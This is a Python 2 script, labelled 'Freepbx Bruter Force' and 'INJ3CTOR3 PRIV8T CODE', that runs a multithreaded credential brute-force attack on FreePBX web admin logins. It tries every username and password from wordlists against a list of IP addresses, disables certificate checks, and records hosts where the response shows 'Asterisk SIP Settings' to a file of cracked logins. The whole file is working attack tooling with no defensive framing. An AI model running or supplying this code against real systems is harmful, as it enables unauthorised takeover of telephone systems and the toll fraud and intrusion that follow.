import re, requests, sys, Queue, threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#edited by HamadaA9A
ux = open('ips.txt', 'a')
uy = open('users.txt', 'a')
uw = open('pwd.txt', 'a')
ThreadNumber = sys.argv[1]
val = open('valid.txt', 'a')
cracked = []
class Apophis(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            Host, user, passwd = self.queue.get()
            self.checker(Host, user, passwd)
            self.queue.task_done()


    def checker(self, host, user, Passwd):
        try:
            if host in str(cracked): return False
            print host + " " + user + " " + Passwd + '\r'
            post = {'username': user, 'password': Passwd}
            session = requests.session()
            r = session.post(host, data=post, verify=False, timeout=30)            
            if re.search("Asterisk SIP Settings", r.text):
                print("[+] Login Success")
                val.write(host + ' ' + user + ' ' + Passwd +'\n')
                val.flush()
                cracked.append(host)
            else:
                
                return False
            return True
        except requests.exceptions.RequestException as e:            
            return False
        except Exception as e:
            print '\r' + host + ' ' + str(e) + '                                                      '
            return False

def main(ips, users, passwords, ThreadNmber):
    queue = Queue.Queue(maxsize=20000)
    for i in range(ThreadNmber):
        try:
            t = Apophis(queue)
            t.daemon = True
            t.start()
        except Exception as e:
            break

    for user in users:
        for passwd in passwords:
            for Host in ips:
                queue.put((Host, user, passwd))

    queue.join()

if __name__ == '__main__':
    with open('ips.txt', 'rU') as ipf:
        ips = ipf.read().splitlines()
    with open('users.txt', 'rU') as uf:
        users = uf.read().splitlines()
    with open('pwd.txt', 'rU') as pf:
        passwords = pf.read().splitlines()
    print 'Freepbx Bruter Force'
    print 'INJ3CTOR3 PRIV8T CODE'
    par = raw_input('Press Enter to continue ')
    if par != '':
       print 'Exit'
    else:
        main(ips, users, passwords, int(ThreadNumber))


